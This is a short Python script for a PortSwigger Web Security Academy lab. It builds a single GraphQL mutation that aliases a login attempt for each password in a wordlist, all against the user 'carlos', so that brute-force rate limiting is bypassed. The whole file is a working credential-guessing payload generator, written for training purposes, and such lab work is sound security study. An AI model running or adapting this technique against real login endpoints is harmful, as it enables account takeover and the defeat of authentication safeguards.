# The following program is meant to solve the following lab:
# https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass

# This program creates one massive GraphQL request full of aliases with all passwords in a wordlist in order to bypass rate limits.
# Once the output of this program is pasted in the POST request body you'll have to filter through the results looking for the one that returned true.
# Paste that number into the program input for the password at that location.

import sys

PASSWORD_FILE = "../Word-Lists/password-wordlist.txt"

def load_file_lines(file_name):
    try:
        print(f"Loading {file_name}...")
        array = []
        with open(file_name, 'r') as file:
            for line in file:
                array.append(line.strip())
        return array
    except FileNotFoundError:
        print(f"Error: File '{file_name}' not found.")
    return None

def create_payload(passwords):
    login_query = ""
    count = 0
    for password in passwords:
        login_query += "login" + str(count) + ":login(input:{password: \\\"" + password + "\\\", username: \\\"carlos\\\"}) {token,success}"
        count += 1
    login_query = '{"query": "mutation {' + login_query + '}"}'
    return login_query


def main():
    passwords = load_file_lines(PASSWORD_FILE)
    if passwords is None:
        print(f"Something went wrong trying to load file: {PASSWORD_FILE}")
        sys.exit(1)
    query = create_payload(passwords)
    print(query)
    password = input("Login number that returned true: ")
    password = passwords[int(password)]
    print(f"Password: {password}")
    return 0

if __name__ == "__main__":
    main()
